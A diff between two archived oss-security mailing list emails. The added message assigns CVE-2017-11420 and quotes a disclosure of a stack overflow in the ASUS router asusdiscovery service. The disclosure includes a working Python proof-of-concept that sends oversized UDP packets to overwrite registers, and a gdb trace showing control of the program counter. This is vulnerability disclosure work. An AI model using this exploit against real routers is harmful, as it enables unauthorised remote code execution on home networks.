@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["815" "Sunday" "27" "March" "2016" "13:34:43" "+0200" "Salvatore Bonaccorso" "carnil@debian.org" "<20160327113443.GA4418@eldamar.local>" "24" "Re: [oss-security] older fuseiso stuff" "^Cc:" nil nil "3" "2016032711:34:43" "[oss-security] older fuseiso stuff" (number mark "        carnil@debia Mar 27   24/815   " thread-indent "\"Re: [oss-security] older fuseiso stuff\"\n") "<54EAF1BE.7080404@redhat.com>" ("<54D54B8F.8070609@redhat.com>" "<54EAF1BE.7080404@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6273" "Tuesday" "18" "July" "2017" "13:58:04" "+0800" "varsleak" "varsleak@gmail.com" "<7ca6da86-2ace-7d71-d177-6d36123ddb2e@gmail.com>" "177" "Re: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" nil nil nil "7" "2017071805:58:04" "[oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" (number mark "U       varsleak@gma Jul 18  177/6273  " thread-indent "\"Re: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability\"\n") "<c3e46525-fa16-529b-ffde-78ea54fc972e@gmail.com>" ("<eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>" "<3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>" "<c3e46525-fa16-529b-ffde-78ea54fc972e@gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 16282 invoked by uid 550); 27 Mar 2016 11:34:58 -0000
+Received: (qmail 22192 invoked by uid 550); 18 Jul 2017 10:28:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,69 +11,226 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 16261 invoked from network); 27 Mar 2016 11:34:58 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=sender:date:from:to:cc:subject:message-id:references:mime-version
-         :content-disposition:in-reply-to:user-agent;
-        bh=/l1JTEiKlkNoMTkhfUlad/i3cduv26zHovf4gCyqY44=;
-        b=nfBpO3DenyilPl0HM5I77f4UEOhR6XZs37zIrZOyr5N8qv5zfeikXasuVtZ51gBn3n
-         7C9HDiNM8xqCjWJOuU5eFG4runirdoVbth8Dsv2NHquLxtd81ZWlAPuFQ2EjzA6y7sTJ
-         mXxZcXrDC3HnDJz3BEyMsYwWp+kYSm1Aty4QzwpDi8OUADzYGwCEJuYCLdO/uzHkWU+1
-         RImtCVBlvxqX7HSq584M55YscHyh2fskPAaFvtxaQyAUYMf0unsR/pCDAhgEPTywFOaM
-         zD0aoutMzmiXJqPU1HtZ9heGqd91YTsWciaCirNSsKrtf2447Q5MKH92holVrUyLh+MU
-         7Ghg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:sender:date:from:to:cc:subject:message-id
-         :references:mime-version:content-disposition:in-reply-to:user-agent;
-        bh=/l1JTEiKlkNoMTkhfUlad/i3cduv26zHovf4gCyqY44=;
-        b=ImLRzzfAnQHJNeKkk5vL0tK95ZKj045YQbiFYhdMz2w0M+NlLannvI8aUU72acmN1l
-         5p/xGVZR2Ma2/gX/Ri7d28iX/CVburtWC4D78y04TGM2l1askVEYkv9WMXxd4Fi06jV9
-         63svuy4jM7R5xgaaA2eMESY2/M44DPaRmCMUYqY0Rgxn9JZ1M0C20Zspo5sOQMWmRTj1
-         h94t/yAhsU5OLGy49oofVpsyG/B9HIexB4X/GvvmVya5ltXGF5sLBKw1ok/Eo77OYh6A
-         7gFq8G0nbo93ypxCEwRRaNTsNbffJZ67FeQJxqQ3G6ALewPWSkN8ifhRNj5j5i8oQbRq
-         IBxA==
-X-Gm-Message-State: AD7BkJLPi+4S/WrS19NdYutj8MVbPEDkS21enPJt/e1XX8kBzrOseXS1WXzO/qgGi76LAg==
-X-Received: by 10.194.9.34 with SMTP id w2mr23319360wja.170.1459078486712;
-        Sun, 27 Mar 2016 04:34:46 -0700 (PDT)
-Message-ID: <20160327113443.GA4418@eldamar.local>
-References: <54D54B8F.8070609@redhat.com>
- <54EAF1BE.7080404@redhat.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <54EAF1BE.7080404@redhat.com>
-User-Agent: Mutt/1.5.24 (2015-08-30)
-Cc: "cve-assign@mitre.org >> Assign a CVE Identifier" <cve-assign@mitre.org>
-Date: Sun, 27 Mar 2016 13:34:43 +0200
-From: Salvatore Bonaccorso <carnil@debian.org>
 Reply-To: oss-security@lists.openwall.com
-Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
-Subject: Re: [oss-security] older fuseiso stuff
-To: oss-security@lists.openwall.com
+Received: (qmail 16173 invoked from network); 18 Jul 2017 05:58:27 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=subject:from:to:references:message-id:date:user-agent:mime-version
+         :in-reply-to:content-language:content-transfer-encoding;
+        bh=bE308u+qKHIcQ8cQ0Vuj3W7EJLV/aF1AVHe69XjWDAk=;
+        b=KSy2KY33YGfsEXesClYMIZEcS8gzPGRvKRMtWoeu4TBvoxBd+6w5nKWY5IfjFFt42K
+         xv0wk+pz5zIZkjXpN4DH5PDx61yKIwcgxZ4QwTKdwyrAG5mPwJNH3GHWvC7VQqyEiP7Y
+         OnkT8qi2yveTds0jTXRhlRV3k3INs+m+wMR0bO9k1aa5kvDwSgXxQxfmbhENSOGnZapa
+         puIuw3+3OF7jB9iv2x0qAjP7PC/EEO/N68rPxNm3PUCg6IkNSs/A8ghv48cCnA63ACNN
+         4sdQFfw39Px+MYG3OUB9jsBtKXBNfB0P8+WPe1t+VDXF1HztYxVxla02IE7E+dhBYBWK
+         i1vA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:subject:from:to:references:message-id:date
+         :user-agent:mime-version:in-reply-to:content-language
+         :content-transfer-encoding;
+        bh=bE308u+qKHIcQ8cQ0Vuj3W7EJLV/aF1AVHe69XjWDAk=;
+        b=d1zmbXl22wIAbCx1IzrPlAVfqv3N8lfWQi5uaVUD1sTxiC310eTP55hJfID5FSFpoe
+         OpT0PfR+WBKtd76/LMtbxtgGbdNvdfB6nM+09IFYgqU0Q2BZy2nmJN5ynuAKhKWU7S1f
+         dA2uQpJJdjOK+i/N2p21l+IBUzIwXvT4r3O25OJakherUjY5O/M7lsjP1bAOwos56Jbn
+         Zfg57OzNHXUVuhesqW+ApHEg/3HFPnG0iLLIvzGvEiPAWWb256G+b53YFHZha+rivyRo
+         pjsCw1cp8RNp9FL2lgjBK5oSE3ipfFQdcC+L3lXrrm4YLZkzOGkUKUGHkjNDtTf4zk5k
+         0ymQ==
+X-Gm-Message-State: AIVw1106utK5ucu2JMYb6FRL0fR8MtlkfpnjHimlBc2Q6basp+uRyM6b
+	DC9pqczDsnqUfixLSGM=
+X-Received: by 10.101.88.67 with SMTP id s3mr23405pgr.224.1500357495340;
+        Mon, 17 Jul 2017 22:58:15 -0700 (PDT)
+From: varsleak <varsleak@gmail.com>
+To: Zach W <kestrel@trylinux.us>, oss-security@lists.openwall.com
+References: <eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>
+ <3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>
+ <c3e46525-fa16-529b-ffde-78ea54fc972e@gmail.com>
+Message-ID: <7ca6da86-2ace-7d71-d177-6d36123ddb2e@gmail.com>
+Date: Tue, 18 Jul 2017 13:58:04 +0800
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.2.1
+MIME-Version: 1.0
+In-Reply-To: <c3e46525-fa16-529b-ffde-78ea54fc972e@gmail.com>
+Content-Type: text/plain; charset=gbk
+Content-Language: en-US
+Content-Transfer-Encoding: 8bit
+Subject: Re: [oss-security] CVE-IDs request for ASUS wiress router Remote
+ Command/Code Execution Vulnerability
 
-Hi,
+Use CVE-2017-11420.
 
-On Mon, Feb 23, 2015 at 10:24:14AM +0100, Florian Weimer wrote:
-> On 02/07/2015 12:17 AM, Kurt Seifried wrote:
-> > https://bugzilla.redhat.com/show_bug.cgi?id=863102 
-> > https://bugzilla.redhat.com/show_bug.cgi?id=863091
-> > 
-> > may warrant a CVE
+On 07/14/2017 10:51, varsleak wrote:
+> They are of course different, CVE-2017-6548 vulnerability code is
+> located in the networkmap service routine, and I found the vulnerability
+> in the asusdiscorvery service program.
 > 
-> I opened up the dependent bugs which have more information:
-> 
-> https://bugzilla.redhat.com/show_bug.cgi?id=861358
-> https://bugzilla.redhat.com/show_bug.cgi?id=862211
-> 
-> Note that fuseiso is fairly broken and does not even support UDF, so
-> its usefulness is limited.  Newer systems have the unprivileged image
-> mounting functionality provided by udisks2, so a userspace
-> implementation of the ISO 9660 and UDF file systems is no longer needed.
-
-Can two CVEs still be assigned for this issue to have an identifier
-for the issues?
-
-Regards,
-Salvatore
+> 在 2017年07月14日 02:39, Zach W 写道:
+>> How is this different from CVE-2017-6548?
+>>
+>> Zach W.
+>>
+>>
+>> On 7/12/17 7:57 PM, varsleak wrote:
+>>> Hello, I review the source of asuswrt-merlin and found a Remote
+>>> Command/Code Execution, the detail as follows:
+>>>
+>>>
+>>> 1. Vulnerability Details
+>>>      Affected Vendor:RT-AC5300,RT_AC1900P,RT-AC68U,RT-AC68P,RT-AC88U,
+>>>      RT-AC66U,RT-AC66U_B1,RT-AC58U,RT-AC56U,RT-AC55U,RT-AC52U,RT-AC51U,
+>>>      RT-N18U,RT-N66U,RT-N56U,RT-AC3200,RT-AC3100,RT_AC1200GU,
+>>>      RT_AC1200G,RT-AC1200,RT-AC53,RT-N12HP,RT-N12HP_B1,RT-N12D1,
+>>>      RT-N12+,RT_N12+_PRO,RT-N16,RT-N300
+>>>      and Asuswrt-Merlin(https://github.com/RMerl/asuswrt-merlin)
+>>>      Affected Product: ASUS Wiress Router
+>>>      Affected Version:  all the latest firmware
+>>>      Platform: router
+>>>      Impact: Remote Command/Code Execution
+>>>      Attack vector: asusdiscorvery service
+>>>
+>>> 2. Vulnerability Description
+>>>      When an ASUS router discovers another router device,
+>>>      it does not buffer the size of all discovered devices
+>>>      when it is added to the device list to cause a stack overflow,
+>>>      resulting in a remote code/command execution vulnerability.
+>>>      The vulnerability code is as follows:
+>>>
+>>> https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/ASUS_Discovery.c#L184-L202
+>>>
+>>> 3. PoC:
+>>> <<<EOF
+>>> # coding=utf-8
+>>>
+>>> import time
+>>> import socket
+>>> import sys
+>>> import os
+>>> import threading
+>>> import struct
+>>> import random
+>>> import time
+>>> ''' Please run PoC first, and it must run on windows '''
+>>> class ASUSDiscoveryBufferOverflow:
+>>> 	""" set remote host and remote port to use exp """
+>>> 	def __init__(self, RHOST, RPORT, LHOST):
+>>> 		self.RHOST = RHOST
+>>> 		self.RPORT = RPORT
+>>> 		self.LHOST = LHOST
+>>> 	
+>>> 	def exploit(self):
+>>> 		""" execute exploit """
+>>> 		self.searchDevice()
+>>> 		self.sentShellCode()
+>>> 		
+>>> 	def searchDevice(self, socket_prot = socket.IPPROTO_UDP):
+>>> 		""" search ASUS Discovery packet """
+>>> 		print("    [-] try to search ASUS Discovery packet")
+>>> 		while(True):
+>>> 			sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_prot)
+>>> 			sniffer.bind((self.LHOST, 0))
+>>> 			sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+>>> 			if os.name == 'nt':
+>>> 				sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
+>>>
+>>> 			pkt, hosts = sniffer.recvfrom(65565)
+>>> 			
+>>> 			if self.RHOST == hosts[0] and '\x11' == pkt[9]:
+>>> 				if (pkt[28] == '\x0C' and
+>>> 				pkt[29] == '\x15' and
+>>> 				pkt[30] == '\x1F' ):
+>>> 					print("    [+] bingo!")
+>>> 					break
+>>>
+>>> 	def sentShellCode(self):
+>>> 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+>>> 		
+>>> 		for i in range(15):
+>>> 			s.sendto(self.makeShellCode(), (self.RHOST, self.RPORT))
+>>> 			print(" [-] sent %d cycle" % (i + 1))
+>>> 			time.sleep(0.2)
+>>> 	
+>>> 	def generatingRandomMacAddr(self):
+>>> 		tmp1 = random.randint(0, 0xff)
+>>> 		tmp2 = random.randint(0, 0xff)
+>>> 		tmp3 = random.randint(0, 0xff)
+>>> 		tmp4 = random.randint(0, 0xff)
+>>> 		tmp5 = random.randint(0, 0xff)
+>>> 		tmp6 = random.randint(0, 0xff)
+>>> 		return struct.pack('6B', \
+>>> 			tmp1, tmp2, tmp3, tmp4, tmp5, tmp6)
+>>> 			
+>>> 	def makeShellCode(self):	
+>>> 		shellcode = "\x0c\x16\x1f\x00" # HEADER [ PLEASE NOT MODIFY ]
+>>> 		shellcode += (128 * b'A') # PKT_GET_INFO.PrinterInfo
+>>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.SSID
+>>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.NetMask
+>>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.ProductID
+>>> 		shellcode += (16 * b'A')  # PKT_GET_INFO.FirmwareVersion
+>>> 		shellcode += b'A'		 # PKT_GET_INFO.OperationMode
+>>> 		shellcode += self.generatingRandomMacAddr() # PKT_GET_INFO.MacAddress	
+>>> 		shellcode += (261 * b'A') #
+>>>
+>>> 		return shellcode
+>>> 		
+>>> def main():
+>>> 	poc = ASUSDiscoveryBufferOverflow('192.168.2.1', 9999, '127.0.0.1')
+>>> 	
+>>> 	print("[+] Try to use exploit ...")
+>>> 	
+>>> 	poc.exploit()
+>>> 	
+>>> 	print("[+] use exploit sucessful.")
+>>>
+>>> if __name__ == '__main__':
+>>> 	main()
+>>> EOF;
+>>>
+>>> 4. gdb trace
+>>> admin@RT-N12HP_B1:/tmp/bin# gdb /usr/sbin/asusdiscovery
+>>>
+>>> GNU gdb 6.8
+>>> Copyright (C) 2008 Free Software Foundation, Inc.
+>>> License GPLv3+: GNU GPL version 3 or later
+>>> <http://gnu.org/licenses/gpl.html>
+>>> This is free software: you are free to change and redistribute it.
+>>> There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+>>> and "show warranty" for details.
+>>> This GDB was configured as "mipsel-linux"...
+>>> I'm sorry, Dave, I can't do that.  Symbol format `elf32-tradlittlemips'
+>>> unknown.
+>>> (gdb) r
+>>> Starting program: /usr/sbin/asusdiscovery
+>>>
+>>> Program received signal SIGSEGV, Segmentation fault.
+>>> 0x41414141 in ?? ()
+>>> (gdb) info r
+>>>           zero       at       v0       v1       a0       a1       a2
+>>>   a3
+>>>  R0   00000000 00000000 303e3134 00423a80 7fd650e8 00000001 00001000
+>>> 00423a80
+>>>             t0       t1       t2       t3       t4       t5       t6
+>>>   t7
+>>>  R8   00423000 00423000 00000581 3a31343a 41414141 2ab89124 41414141
+>>> 2ab0fe10
+>>>             s0       s1       s2       s3       s4       s5       s6
+>>>   s7
+>>>  R16  41414141 41414141 41414141 41414141 41414141 41414141 41414141
+>>> 41413e41
+>>>             t8       t9       k0       k1       gp       sp       s8
+>>>   ra
+>>>  R24  00000014 2ab6ad70 7fd65f66 00000000 0041c050 7fd65d30 41414141
+>>> 41414141
+>>>         status       lo       hi badvaddr    cause       pc
+>>>       01009c13 0000035d 00000070 41414140 00000008 41414141
+>>>           fcsr      fir  restart
+>>>       00000000 00000000 00000000
+>>>
+>>> As we have seen, the registers s0-s8,t4,t6,ra and pc are overwritten by
+>>> 0x41.
+>>>
+>>> Finally, with the ROP can lead to Remote Command Execution.
+>>>
+>>> 5. Discover
+>>>     varsleak of Sichuan Silent Information Technology Co., Ltd
+>>>     company website: http://www.silence.com.cn/
+>>
